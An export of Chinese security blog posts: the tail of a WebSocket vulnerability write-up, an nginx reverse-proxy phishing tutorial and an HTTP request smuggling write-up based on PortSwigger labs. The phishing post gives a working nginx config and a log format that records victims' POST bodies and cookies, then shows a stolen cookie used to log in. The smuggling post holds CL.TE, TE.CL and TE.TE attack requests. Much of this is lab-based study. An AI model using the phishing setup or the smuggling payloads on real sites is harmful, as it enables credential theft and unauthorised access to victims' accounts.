<h3 id="5-2-操纵WebSocket握手以利用漏洞"><a href="#5-2-操纵WebSocket握手以利用漏洞" class="headerlink" title="5.2 操纵WebSocket握手以利用漏洞"></a>5.2 操纵WebSocket握手以利用漏洞</h3><p>只能通过操纵WebSocket握手来发现和利用某些WebSocket漏洞。这些漏洞往往涉及设计缺陷，例如：</p>
<ul>
<li>在HTTP标头中放错位置的信任以执行安全性决策，例如<code>X-Forwarded-For</code>标头。</li>
<li>会话处理机制存在缺陷，因为处理WebSocket消息的会话上下文通常由握手消息的会话上下文确定。</li>
<li>应用程序使用的自定义HTTP标头引入的攻击面。</li>
</ul>
<p>靶机url：<a href="https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities" target="_blank" rel="noopener">https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities</a></p>
<p>复现详情：</p>
<p>同理，直接在实时聊天的对话框中插入xss，观察到攻击已被阻止，并且WebSocket连接已终止。重新加载后，观察到连接尝试失败，因为IP地址已被禁止。</p>
<p><img src="https://image.3001.net/images/20201018/16030254588558.png" alt="image-20201017004507988"></p>
<p>重新请求并抓包，修改请求头，添加xff：</p>
<p><img src="https://image.3001.net/images/20201018/16030254604511.png" alt="image-20201017004656270"></p>
<p>可以重新连接WebSocket，并尝试有效的xss：</p>
<p><img src="https://image.3001.net/images/20201018/16030254625868.png" alt="image-20201017010007974"></p>
<p>成功弹窗：</p>
<p><img src="https://image.3001.net/images/20201018/16030254654499.png" alt="image-20201017005721299"></p>
<h3 id="5-3-使用跨站点WebSocket利用漏洞"><a href="#5-3-使用跨站点WebSocket利用漏洞" class="headerlink" title="5.3 使用跨站点WebSocket利用漏洞"></a>5.3 使用跨站点WebSocket利用漏洞</h3><p>当攻击者从攻击者控制的网站建立跨域WebSocket连接时，会出现一些WebSockets安全漏洞。这称为跨站点WebSocket劫持攻击，它涉及利用WebSocket握手上的跨站点请求伪造（CSRF）漏洞。攻击通常会产生严重的影响，使攻击者可以代表受害者用户执行特权操作或捕获受害者用户可以访问的敏感数据。</p>
<h4 id="5-3-1-什么是跨站点WebSocket劫持？"><a href="#5-3-1-什么是跨站点WebSocket劫持？" class="headerlink" title="5.3.1 什么是跨站点WebSocket劫持？"></a>5.3.1 什么是跨站点WebSocket劫持？</h4><p>跨站点WebSocket劫持（也称为跨域WebSocket劫持）涉及WebSocket握手上的跨站点请求伪造（CSRF）漏洞。当WebSocket握手请求仅依靠HTTP cookie进行会话处理并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。</p>
<p>攻击者可以在自己的域上创建恶意网页，从而建立与易受攻击的应用程序的跨站点WebSocket连接。该应用程序将在受害用户与该应用程序的会话的上下文中处理连接。</p>
<p>然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器接收回的消息内容。这意味着，与常规CSRF不同，攻击者可以与受感染的应用程序进行双向交互。</p>
<h4 id="5-3-2-跨站点WebSocket劫持有什么影响？"><a href="#5-3-2-跨站点WebSocket劫持有什么影响？" class="headerlink" title="5.3.2 跨站点WebSocket劫持有什么影响？"></a>5.3.2 跨站点WebSocket劫持有什么影响？</h4><p>成功的跨站点WebSocket劫持攻击通常会使攻击者能够：</p>
<ul>
<li><strong>执行伪装成受害者用户的未授权操作。</strong>与常规CSRF一样，攻击者可以将任意消息发送到服务器端应用程序。如果应用程序使用客户端生成的WebSocket消息执行任何敏感操作，则攻击者可以跨域生成合适的消息并触发这些操作。</li>
<li><strong>检索用户可以访问的敏感数据。</strong>与常规CSRF不同，跨站点WebSocket劫持使攻击者可以通过劫持的WebSocket与易受攻击的应用程序进行双向交互。如果应用程序使用服务器生成的WebSocket消息将任何敏感数据返回给用户，则攻击者可以拦截这些消息并捕获受害用户的数据。</li>
</ul>
<h4 id="5-3-3-执行跨站点WebSocket劫持攻击"><a href="#5-3-3-执行跨站点WebSocket劫持攻击" class="headerlink" title="5.3.3 执行跨站点WebSocket劫持攻击"></a>5.3.3 执行跨站点WebSocket劫持攻击</h4><p>由于跨站点WebSocket劫持攻击本质上是WebSocket握手上的CSRF漏洞，因此执行攻击的第一步是检查应用程序执行的WebSocket握手，并确定是否针对CSRF进行了保护。</p>
<p>就CSRF攻击的正常情况而言，您通常需要查找仅依赖HTTP cookie进行会话处理并且在请求参数中不使用任何令牌或其他不可预测值的握手消息。</p>
<p>例如，以下WebSocket握手请求可能容易受到CSRF的攻击，因为唯一的会话令牌是在cookie中传输的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w&#x3D;&#x3D;</span><br><span class="line">Connection: keep-alive, Upgrade</span><br><span class="line">Cookie: session&#x3D;KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line">Upgrade: websocket</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>该<code>Sec-WebSocket-Key</code>头包含一个随机值，以防止缓存代理的错误，而不是用于身份验证或会话处理的目的。</p>
</blockquote>
<p>如果WebSocket握手请求容易受到CSRF的攻击，则攻击者的网页可以执行跨站点请求以在易受攻击的站点上打开WebSocket。攻击的下一步将完全取决于应用程序的逻辑以及它如何使用WebSockets。攻击可能涉及：</p>
<ul>
<li>发送WebSocket消息以代表受害者用户执行未经授权的操作。</li>
<li>发送WebSocket消息以检索敏感数据。</li>
<li>有时，只是等待包含敏感数据的传入消息到达。</li>
</ul>
<h2 id="6-如何保护WebSocket连接"><a href="#6-如何保护WebSocket连接" class="headerlink" title="6. 如何保护WebSocket连接"></a>6. 如何保护WebSocket连接</h2><p>为了将WebSocket引起的安全漏洞的风险降至最低，请使用以下准则：</p>
<ul>
<li>使用<code>wss://</code>协议（基于TLS的WebSockets）。</li>
<li>硬编码WebSockets终结点的URL，当然不要将用户可控制的数据合并到此URL中。</li>
<li>保护WebSocket握手消息免受CSRF的攻击，以避免跨站点WebSocket劫持漏洞。</li>
<li>双向将通过WebSocket接收的数据视为不可信。在服务器和客户端上安全地处理数据，以防止基于输入的漏洞，例如SQL注入和跨站点脚本。</li>
</ul>
]]></content>
      <categories>
        <category>WebSockets</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理钓鱼</title>
    <url>/2020/10/23/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<h1 id="nginx反向代理钓鱼"><a href="#nginx反向代理钓鱼" class="headerlink" title="nginx反向代理钓鱼"></a>nginx反向代理钓鱼</h1><h2 id="一、反向代理"><a href="#一、反向代理" class="headerlink" title="一、反向代理"></a>一、反向代理</h2><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。</p>
<p><img src="https://image.3001.net/images/20201024/16034962257029.png" alt="image-20201021042310179"></p>
<a id="more"></a>

<h2 id="二、部署配置"><a href="#二、部署配置" class="headerlink" title="二、部署配置"></a>二、部署配置</h2><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1.安装nginx"></a>1.安装nginx</h3><p>不做赘述，具体百度。</p>
<h3 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h3><p>打开nginx的配置文件<code>/etc/nginx/nginx.conf</code>，具体虚拟主机的配置包含在另一个文件中</p>
<p><img src="https://image.3001.net/images/20201024/160349622898.png" alt="image-20201021043958270"></p>
<p>打开<code>/etc/nginx/conf.d/</code>文件夹，新建一个test.conf文件，做具体的信息配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen  8080;</span><br><span class="line">        server_name     47.xx.xx.xx;</span><br><span class="line">        index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        access_log      &#x2F;var&#x2F;log&#x2F;nginx&#x2F;test.log Testlog;</span><br><span class="line">    </span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                proxy_next_upstream http_502 http_504 error timeout invalid_header;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;xxx.com&#x2F;;</span><br><span class="line">                proxy_set_header Host 47.xx.xx.xx;</span><br><span class="line">                proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server_name</code> 为域名，这里我用自己服务器的ip<br><code>access_log</code> 为设置输出日志的路径<br><code>proxy_next_upstream</code> 如果后端的服务器返回 502、504、执行超时等错误，自动将请求转发upstream负载均衡池中的另一台服务器，实现故障转移。<br><code>proxy_pass</code> 需要反向代理的网站<br><code>proxy_set_header</code>  用于在向反向代理的后端 Web 服务器发起请求时添加指定的 Header头信息。</p>
<p>当后端 Web 服务器上有多个基于域名的虚拟主机时，要通过添加 Header 头信息 Host，用于指定请求的域名，这样后端 Web 服务器才能识别该反向代理访问请求由哪一个虚拟主机来处理。</p>
<p>最后我们还需要设置以下 访问日志需要获取的内容 也是在<code>nginx.conf</code>里修改。在http模块中添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log_format Testlog escape&#x3D;json &#39;$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body&#39; $http_cookie;</span><br></pre></td></tr></table></figure>

<p>Testlog 要和上面的<code>access_log</code>对应不然日志不会起作用。</p>
<p>重点是<code>$request_body(获取post数据),$http_cookie(获取cookie数据)</code>这就是我们钓鱼的核心了。当有人访问并登陆我们反向代理的网站以后 我们点开日志就可以看到他的cookie和post提交的用户名和密码了。</p>
<h2 id="三、上手实战"><a href="#三、上手实战" class="headerlink" title="三、上手实战"></a>三、上手实战</h2><p>使用某网站做上述配置进行反向代理，配置完成后访问自己服务器ip，可以看到是自己的ip，显示目标系统的界面，说明反向代理成功。</p>
<p><img src="https://image.3001.net/images/20201024/16034962325695.png" alt="image-20201021051523406"></p>
<p>进行登录操作后，可以在日志中看到获取的cookie</p>
<p><img src="https://image.3001.net/images/20201024/16034962382259.png" alt="image-20201021052001089"></p>
<p>使用cookie进行登录访问，成功进入。</p>
<p><img src="https://image.3001.net/images/20201024/16034962359939.png" alt="image-20201021052143060"></p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>nginx</tag>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP请求走私</title>
    <url>/2020/07/16/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>​    在这个网络环境下，前端服务器负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。在这种情况下可以利用HTTP请求走私，将无法访问的请求走私给后端服务器以获得响应。</p>
<p><img src="https://image.3001.net/images/20200716/15949110707602.png" alt="image-20200714170553642"></p>
<a id="more"></a>

<p>​    最近系统性的学习了下HTTP请求走私，通过大佬的博客理论基础+靶机实操整理了如下：</p>
<h2 id="1、HTTP请求走私攻击会发生什么？"><a href="#1、HTTP请求走私攻击会发生什么？" class="headerlink" title="1、HTTP请求走私攻击会发生什么？"></a>1、HTTP请求走私攻击会发生什么？</h2><p>​    当今的Web应用程序经常在用户和最终的应用程序逻辑之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理），并且此服务器将请求转发到一个或多个后端服务器。在现代的基于云的应用程序中，这种类型的架构变得越来越普遍，在某些情况下是不可避免的。</p>
<p>​    当前端服务器将HTTP请求转发到后端服务器时，它通常会通过同一后端网络连接发送多个请求，因为这样做效率更高且性能更高。该协议非常简单：HTTP请求一个接一个地发送，接收服务器解析HTTP请求标头以确定一个请求在哪里结束，下一个请求在哪里开始：</p>
<p><img src="https://image.3001.net/images/20200716/15949110762923.png" alt="image-20200714171040520"></p>
<p>​    在这种情况下，至关重要的是前端和后端系统就请求之间的边界达成一致。否则，攻击者可能会发送一个模棱两可的请求，该请求被前端和后端系统以不同的方式解释：</p>
<p><img src="https://image.3001.net/images/20200716/15949110806977.png" alt="image-20200714171100673"></p>
<p>​    在这里，攻击者使前端请求的一部分被后端服务器解释为下一个请求的开始。它实际上是在下一个请求之前，因此会干扰应用程序处理该请求的方式。这是请求走私攻击，可能会造成破坏性后果。</p>
<h2 id="2、HTTP请求走私漏洞如何产生？"><a href="#2、HTTP请求走私漏洞如何产生？" class="headerlink" title="2、HTTP请求走私漏洞如何产生？"></a>2、HTTP请求走私漏洞如何产生？</h2><p>​    大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p>
<p>​    该<code>Content-Length</code>头是直接的：它指定消息体的以字节为单位的长度。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>

<p>​    该<code>Transfer-Encoding</code>首标可以被用于指定该消息体的用途分块编码。这意味着消息正文包含一个或多个数据块。每个块均由以字节为单位的块大小（以十六进制表示）组成，后跟换行符，然后是块内容。该消息以大小为零的块终止。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q&#x3D;smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>​    由于HTTP规范提供了两种不同的方法来指定HTTP消息的长度，因此单个消息可能会同时使用这两种方法，从而使它们彼此冲突。HTTP规范试图通过指出如果<code>Content-Length</code>和<code>Transfer-Encoding</code>标头同时存在，<code>Content-Length</code>则应忽略标头来防止此问题。当仅使用一台服务器时，这足以避免歧义，但是当将两个或多个服务器链接在一起时，这并不能避免歧义。在这种情况下，可能由于两个原因而出现问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">某些服务器不支持 Transfer-Encoding 请求中的标头。</span><br><span class="line">Transfer-Encoding 如果以某种方式混淆了标头，则可能会诱使 某些确实支持标头的服务器不对其进行处理。</span><br></pre></td></tr></table></figure>

<p>​    如果前端服务器和后端服务器相对于（可能是混淆的）<code>Transfer-Encoding</code> 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞。</p>
<h2 id="3、HTTP请求走私类型"><a href="#3、HTTP请求走私类型" class="headerlink" title="3、HTTP请求走私类型"></a>3、HTTP请求走私类型</h2><h3 id="3-1-CL不为0的GET请求"><a href="#3-1-CL不为0的GET请求" class="headerlink" title="3.1 CL不为0的GET请求"></a>3.1 CL不为0的GET请求</h3><p>​    前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的<code>Content-Length</code>，不进行处理，从而导致请求走私。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>​    前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求。</p>
<h3 id="3-2-CL-CL"><a href="#3-2-CL-CL" class="headerlink" title="3.2 CL-CL"></a>3.2 CL-CL</h3><p>​    假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端服务器按照第二个<code>Content-Length</code>的值进行处理。这样有可能引发请求走私。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>​    前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为7的数据包。因此读取前7个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。</p>
<p>​    但此时缓冲区仍留下一个a，对于后端服务器来讲，这个a是下一个请求的一部分，但没传输完毕。如果此时传来一个请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>

<p>​    那么前端服务器和后端服务器将重用TCP连接，使后端实际接收的请求为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aGET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>

<p>​    从而实现了一次HTTP请求攻击。</p>
<h3 id="3-3-CL-TE"><a href="#3-3-CL-TE" class="headerlink" title="3.3 CL-TE"></a>3.3 CL-TE</h3><p>​    所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p>
<p>​    chunk传输数据格式如下，其中size的值由16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure>

<p>​    Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
<p>​    构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5\r\n</span><br><span class="line">Cookie: session&#x3D;E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<p>​    连续发送几次请求就可以获得该响应。</p>
<p><img src="https://image.3001.net/images/20200716/15949110901703.png" alt="image-20200714222119186"></p>
<p>​    由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<p>​    当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>​    服务器在解析时当然会产生报错了。</p>
<h3 id="3-4-TE-CL"><a href="#3-4-TE-CL" class="headerlink" title="3.4 TE-CL"></a>3.4 TE-CL</h3><p>​    所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
<p>​    构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5\r\n</span><br><span class="line">Cookie: session&#x3D;3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949110942229.png" alt="image-20200714225318848"></p>
<p>​    由于前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>成功报错。</p>
<h3 id="3-5-TE-TE"><a href="#3-5-TE-TE" class="headerlink" title="3.5 TE-TE"></a>3.5 TE-TE</h3><p>​    <code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
<p>​    构造数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5\r\n</span><br><span class="line">Cookie: session&#x3D;Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x&#x3D;1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200716/15949111003969.png" alt="image-20200714233446131"></p>
<p>​    需要<code>\r\n\r\n</code>在后面加上尾随序列<code>0</code>。</p>
<h2 id="4、查找HTTP请求走私漏洞"><a href="#4、查找HTTP请求走私漏洞" class="headerlink" title="4、查找HTTP请求走私漏洞"></a>4、查找HTTP请求走私漏洞</h2><h3 id="4-1-使用计时技术查找HTTP请求走私漏洞"><a href="#4-1-使用计时技术查找HTTP请求走私漏洞" class="headerlink" title="4.1 使用计时技术查找HTTP请求走私漏洞"></a>4.1 使用计时技术查找HTTP请求走私漏洞</h3><p>​    检测HTTP请求走私漏洞的最普遍有效方法是发送请求，如果存在漏洞，该请求将导致应用程序响应中的时间延迟。</p>
<h4 id="4-1-1-使用计时技术查找CL-TE漏洞"><a href="#4-1-1-使用计时技术查找CL-TE漏洞" class="headerlink" title="4.1.1 使用计时技术查找CL.TE漏洞"></a>4.1.1 使用计时技术查找CL.TE漏洞</h4><p>​    如果应用程序容易受到请求走私的CL.TE变体的攻击，则发送如下所示的请求通常会导致时间延迟：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">A</span><br><span class="line">X</span><br></pre></td></tr></table></figure>

<p>​    由于前端服务器使用<code>Content-Length</code>标头，因此它将仅转发此请求的一部分，而忽略<code>X</code>。后端服务器使用<code>Transfer-Encoding</code>标头，处理第一个块，然后等待下一个块到达。这将导致明显的时间延迟。</p>
<h4 id="4-1-2-使用计时技术查找TE-CL漏洞"><a href="#4-1-2-使用计时技术查找TE-CL漏洞" class="headerlink" title="4.1.2 使用计时技术查找TE.CL漏洞"></a>4.1.2 使用计时技术查找TE.CL漏洞</h4><p>​    如果应用程序容易受到TE.CL变种的请求走私攻击，则发送如下所示的请求通常会导致时间延迟：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure>

<p>​    由于前端服务器使用<code>Transfer-Encoding</code>标头，因此它将仅转发此请求的一部分，而忽略<code>X</code>。后端服务器使用<code>Content-Length</code>标头，期望消息正文中有更多内容，然后等待其余内容到达。这将导致明显的时间延迟。</p>
<blockquote>
<p>​    如果应用程序容易受到该漏洞的CL.TE变体的攻击，则基于时间的TE.CL漏洞测试可能会破坏其他应用程序用户。因此，要隐身并最大程度地减少中断，您应该首先使用CL.TE测试，只有在第一个测试失败的情况下才继续进行TE.CL测试。</p>
</blockquote>
<h3 id="4-2-使用差异响应确认HTTP请求走私漏洞"><a href="#4-2-使用差异响应确认HTTP请求走私漏洞" class="headerlink" title="4.2 使用差异响应确认HTTP请求走私漏洞"></a>4.2 使用差异响应确认HTTP请求走私漏洞</h3><p>​    当检测到可能的请求走私漏洞时，您可以利用此漏洞触发应用程序响应内容的差异来获取该漏洞的进一步证据。这涉及快速连续地向应用程序发送两个请求：</p>
<ul>
<li>一种“攻击”请求，旨在干扰下一个请求的处理。</li>
<li>“正常”请求。</li>
</ul>
<h4 id="4-2-1-使用差异响应确认CL-TE漏洞"><a href="#4-2-1-使用差异响应确认CL-TE漏洞" class="headerlink" title="4.2.1 使用差异响应确认CL.TE漏洞"></a>4.2.1 使用差异响应确认CL.TE漏洞</h4><p>​    要确认CL.TE漏洞，您将发送如下攻击请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 50</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">q&#x3D;smuggling&amp;x&#x3D;</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;404 HTTP&#x2F;1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<p>​    如果攻击成功，则后端服务器会将此请求的最后两行视为属于接收到的下一个请求。这将导致随后的“正常”请求如下所示：</p>
